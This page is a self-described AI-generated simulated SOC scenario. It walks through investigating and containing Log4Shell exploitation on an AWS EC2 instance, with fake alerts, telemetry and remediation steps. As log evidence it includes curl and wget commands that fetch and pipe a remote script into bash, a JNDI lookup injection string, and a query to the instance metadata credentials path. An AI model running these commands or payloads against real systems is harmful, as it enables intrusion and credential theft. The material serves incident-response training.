---
Owner: Chris Adams
title: Exploitation of Log4Shell in AWS Environment
type: Simulated Scenario
edited: 
layout: new_page
Summary: Logs indicating Log4j RCE exploit. Review the investigation activity.
tags:
  - ai-generated
  - cybersecurity/exploit
draft: false
date: 2024-11-13
topic: cloud
---
> [!Important] Important!
> This is a fake scenario generated by AI and is meant solely for educational purposes. 
### **Scenario: Exploitation of Log4Shell Vulnerability in AWS Environment**

#### **Background:**
It’s Friday evening, and your SOC receives an alert about unusual traffic patterns targeting an externally accessible EC2 instance hosting a Java-based web application. The web application is a critical internal tool, deployed in AWS, that relies on Log4j for logging. 

Security teams had been made aware of **CVE-2021-44228 (Log4Shell)**, which allows remote code execution via a specially crafted request, but it appears the instance was not patched. This alert indicates that the web application might be under attack, leveraging this vulnerability to achieve remote code execution.

Your task is to investigate, confirm whether the vulnerability was exploited, and assess if any malicious payloads have been executed within the AWS environment.

<div class="neon-line"></div>

#### **Alert Summary and Log Sources:**

1. **Unusual API Calls Detected (CloudTrail)**  
   Type: CloudTrail Alert  
   Source: `EC2-App-Prod-01`  
   Description: CloudTrail logs indicate that the application on `EC2-App-Prod-01` initiated API calls it doesn’t normally perform, including `CreateSecurityGroup`, `AuthorizeSecurityGroupIngress`, and `DescribeInstances`, which suggests possible command injection.

2. **Outbound Traffic to Suspicious IPs (VPC Flow Logs)**  
   Type: Network Behavior Anomaly Alert  
   Source: `EC2-App-Prod-01`  
   Description: VPC Flow Logs show connections from `EC2-App-Prod-01` to suspicious external IP addresses (e.g., 198.51.100.50 and 203.0.113.25) on uncommon ports, potentially indicating malware callback or data exfiltration.

3. **EC2 Metadata Access Attempted (AWS Config)**  
   Type: AWS Config Alert  
   Source: `EC2-App-Prod-01`  
   Description: AWS Config flagged multiple attempts to access instance metadata (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) from within `EC2-App-Prod-01`, suggesting an attempt to retrieve IAM role credentials.

4. **Execution of Unfamiliar Processes (AWS CloudWatch Logs)**  
   Type: CloudWatch Logs Alert  
   Source: `EC2-App-Prod-01`  
   Description: CloudWatch logs report the execution of unfamiliar processes (e.g., `/bin/bash -c "curl http://malicious-domain.com/payload.sh | bash"`), indicating possible exploitation and remote code execution.

<div class="neon-line"></div>

### **Objective:**
Identify if `CVE-2021-44228 (Log4Shell)` has been exploited, assess the scope of the compromise, and take containment actions. Focus on tracing the attacker’s actions to understand the extent of their access and prevent further exploitation.

<div class="neon-line"></div>

### **Fake Telemetry Details and Logs**

#### **Alert 1: Unusual API Calls Detected (CloudTrail)**

**Telemetry Data (CloudTrail Logs):**
- **Source Instance**: `EC2-App-Prod-01`
- **API Calls Detected**:
  - `CreateSecurityGroup` named `temp-sec-group` with open SSH access from 0.0.0.0/0.
  - `AuthorizeSecurityGroupIngress` to open port 22 on `temp-sec-group`.
  - `DescribeInstances` listing all EC2 instances in the environment.
- **Event Timeline**:
  - **9:00 PM** - `CreateSecurityGroup` request by `EC2-App-Prod-01`
  - **9:05 PM** - `AuthorizeSecurityGroupIngress` on `temp-sec-group`
  - **9:10 PM** - `DescribeInstances` API call

**Analysis:**  
These unauthorized API calls indicate the attacker is attempting to gain unrestricted SSH access, likely for persistent command-and-control access.

<div class="neon-line"></div>

#### **Alert 2: Outbound Traffic to Suspicious IPs (VPC Flow Logs)**

**Telemetry Data (VPC Flow Logs):**
- **Source Instance**: `EC2-App-Prod-01`
- **Destination IPs**: 198.51.100.50, 203.0.113.25 (known malicious IPs)
- **Traffic Details**:
  - **Port**: 8080, 4444 (ports often used for callbacks and reverse shells)
  - **Event Timeline**:
    - **9:15 PM** - Outbound connection attempt to 198.51.100.50:8080
    - **9:20 PM** - Outbound connection attempt to 203.0.113.25:4444

**Analysis:**  
These outbound connections to known malicious IPs suggest the attacker might have deployed malware that is attempting to communicate with a command-and-control (C2) server.

<div class="neon-line"></div>

#### **Alert 3: EC2 Metadata Access Attempted (AWS Config)**

**Telemetry Data (AWS Config Logs):**
- **Source Instance**: `EC2-App-Prod-01`
- **Metadata Path Accessed**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **Event Timeline**:
  - **9:30 PM** - Multiple HTTP GET requests to the metadata endpoint from within `EC2-App-Prod-01`

**Analysis:**  
The attacker likely attempted to retrieve IAM credentials by querying the instance metadata, which can be accessed locally. This is a common technique for escalating privileges by gaining access to temporary credentials assigned to the instance.

<div class="neon-line"></div>

#### **Alert 4: Execution of Unfamiliar Processes (CloudWatch Logs)**

**Telemetry Data (CloudWatch Logs):**
- **Source Instance**: `EC2-App-Prod-01`
- **Commands Executed**:
  - `/bin/bash -c "curl http://malicious-domain.com/payload.sh | bash"`  
  - `/bin/bash -c "wget http://malicious-domain.com/payload.sh -O - | bash"`
- **Event Timeline**:
  - **9:35 PM** - Remote script execution initiated using `curl`.
  - **9:40 PM** - Additional script execution initiated using `wget`.

**Analysis:**  
These commands indicate that a malicious payload has been downloaded and executed, likely as a result of exploiting the Log4Shell vulnerability in the Java-based application.

<div class="neon-line"></div>

### **Investigation Steps**

Here’s a structured investigation flow to analyze the scenario and understand the attack’s progression.

#### **Step 1: Confirm Exploitation of CVE-2021-44228 (Log4Shell)**

- **Analyze Application Logs on `EC2-App-Prod-01`**:
  - Look for signs of suspicious JNDI lookup calls (`jndi:ldap://malicious-domain.com/`) within the Java application logs. These LDAP calls are a known indicator of Log4Shell exploitation.
  
- **Review Web Access Logs**:
  - Check access logs for unusual patterns such as `GET` requests with `${jndi:ldap://malicious-server/...}` strings that might indicate the use of Log4Shell.

#### **Step 2: Investigate Unusual API Calls and Metadata Access**

- **Analyze CloudTrail for Unauthorized API Actions**:
  - Identify all API actions performed by `EC2-App-Prod-01`, especially the creation of new security groups, which could facilitate unrestricted access.
  - Verify if the metadata service requests were successful and if IAM temporary credentials were retrieved by the attacker.
  
- **Correlate with AWS Config Data**:
  - Confirm the IAM role assigned to `EC2-App-Prod-01` and determine if it provides privileges that could be used to create or modify security groups and access S3 resources.

#### **Step 3: Confirm Malicious Outbound Connections**

- **Examine VPC Flow Logs for Connection Patterns**:
  - Track connections to the suspicious IPs and confirm if data was exfiltrated or if these were reverse-shell callbacks. Monitor for repeated attempts to connect over commonly used C2 ports (e.g., 4444).
  
- **Check for Known C2 Domains/IPs**:
  - Cross-reference the external IP addresses with threat intelligence feeds to determine if they are associated with known threat actors exploiting Log4Shell.

#### **Step 4: Validate Malicious Payload Execution**

- **Analyze CloudWatch and OS Logs for Suspicious Processes**:
  - Investigate CloudWatch logs to confirm the payload executed via `curl` and `wget` (e.g., `curl http://malicious-domain.com/payload.sh | bash`). Determine if additional commands were executed.
  
- **Identify Files and Persistence Mechanisms**:
  - Check if the payload installed additional scripts or created persistence mechanisms (e.g., new cron jobs or startup scripts) on `EC2-App-Prod-01`.

<div class="neon-line"></div>

### **Containment and Remediation Actions**

1. **Immediate Actions:**
   - **Isolate `EC2-App-Prod-01` from the Network** to prevent further outbound connections or inbound exploitation attempts.
   - **Revoke Temporary IAM Credentials** assigned to `EC2-App-Prod-01` if any were compromised by the attacker via metadata API access.
   - **Delete Unauthorized Security Groups** to close any SSH access opened by the attacker and restrict further inbound access.

2. **Remediation:**
   - **Patch Log4j on Affected Application**: Update the Java application on `EC2-App-Prod-01` with the latest Log4j version to mitigate CVE-202

1-44228.
   - **Rotate All IAM Credentials** for accounts accessed during the incident, including temporary credentials obtained from the instance metadata service.
   - **Deploy Web Application Firewall (WAF) Rules**: Set up WAF rules to block suspicious patterns commonly associated with Log4Shell, such as JNDI lookups.

3. **Long-Term Security Improvements:**
   - **Enforce Strict IAM Role Permissions**: Review and apply least privilege principles to the IAM roles associated with EC2 instances.
   - **Enable VPC Flow Logs and GuardDuty**: Ensure that network traffic and threat monitoring are active across critical instances.
   - **Implement Logging and Monitoring for Application Vulnerabilities**: Use tools like Amazon Inspector to identify vulnerable applications and configurations automatically.

<div class="neon-line"></div>

This scenario showcases the importance of correlating AWS logs and demonstrates the impact of a known CVE like Log4Shell when exploited in cloud environments. It provides a real-world example of how an analyst might investigate and contain such a threat.

<div class="neon-line"></div>

#### Created on: Nov 13, 2024
---
<div style="text-align: center;">
	<div class="gradient-text">👾 2024 rabb1th0les (Chris A)dams 👾</div> 
	🌴☀Thanks for supporting my page ☀🌴
	<nav>
		<ul style="list-style: none; padding: 0;">
			<div style="text-align: center;">
				<li><a href="Contact.html">Contact</a></li>
			</div>
		</ul>
	</nav>	
</div>